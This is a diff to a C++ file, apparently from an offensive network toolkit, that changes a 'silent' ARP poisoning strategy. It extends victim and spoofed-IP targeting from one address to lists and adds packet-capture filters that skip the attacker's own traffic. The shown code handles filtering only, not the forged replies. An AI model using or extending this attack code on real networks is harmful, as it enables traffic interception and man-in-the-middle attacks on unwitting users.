@@ -1,14 +1,18 @@
 #include "arp_poisoning/silent.h"
 #include "ArpLayer.h"
 #include "EthLayer.h"
+#include "IpAddress.h"
 #include "Packet.h"
 #include "PcapFilter.h"
 #include "PcapLiveDevice.h"
+#include "ProtocolType.h"
 #include "RawPacket.h"
 #include "log.h"
+#include <algorithm>
 #include <exception>
 #include <future>
 #include <stdexcept>
+#include <vector>
 
 void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
@@ -25,14 +29,22 @@ void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
         device->stopCapture();
     }
 
+    const bool isMessageToAttacker =
+        requestEthLayer->getSourceMac() == device->getMacAddress() ||
+        requestEthLayer->getSourceMac() == attackerMac_ ||
+        requestArpLayer->getTargetIpAddr() == device->getIPv4Address();
+    const bool isIpToSpoof =
+        std::find(ipsToSpoof_.begin(), ipsToSpoof_.end(),
+                  requestArpLayer->getTargetIpAddr()) != ipsToSpoof_.end();
+    const bool isFromVictim =
+        std::find(victimIps_.begin(), victimIps_.end(),
+                  requestArpLayer->getSenderIpAddr()) != victimIps_.end();
+
     // determine whether or not to handle packet
-    if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
-         requestEthLayer->getSourceMac() == attackerMac_) ||
-        (requestArpLayer->getTargetIpAddr() != ipToSpoof_ ||
-         requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) ||
-        (victimIp_.has_value() &&
-         requestArpLayer->getSenderIpAddr() != victimIp_.value())) {
-        LOG_INFO("skipped packet");
+    if (isMessageToAttacker || !isIpToSpoof || !isFromVictim) {
+        LOG_INFO("skipped packet: src " << requestArpLayer->getSenderIpAddr()
+                                        << " to "
+                                        << requestArpLayer->getTargetIpAddr());
         return;
     }
 
@@ -69,9 +81,19 @@ void ATK::ARP::SilentArpPoisoningStrategy::execute() {
     // set filters
     pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
     pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
+    pcpp::ProtoFilter protoFilter(pcpp::ARP);
+
+    // set filter to mac not to self
+    pcpp::MacAddressFilter deviceMacAdressFilter(device_->getMacAddress(),
+                                                 pcpp::Direction::SRC_OR_DST);
+    pcpp::NotFilter notDeviceMacAdress(&deviceMacAdressFilter);
+
     pcpp::AndFilter andFilter;
     andFilter.addFilter(&arpFilter);
     andFilter.addFilter(&etherTypeFilter);
+    andFilter.addFilter(&protoFilter);
+    andFilter.addFilter(&notDeviceMacAdress);
+    // TODO(jasonfu): test if ipv4 filters are usable for arp packets
 
     if (!device_->setFilter(andFilter)) {
         device_->close();
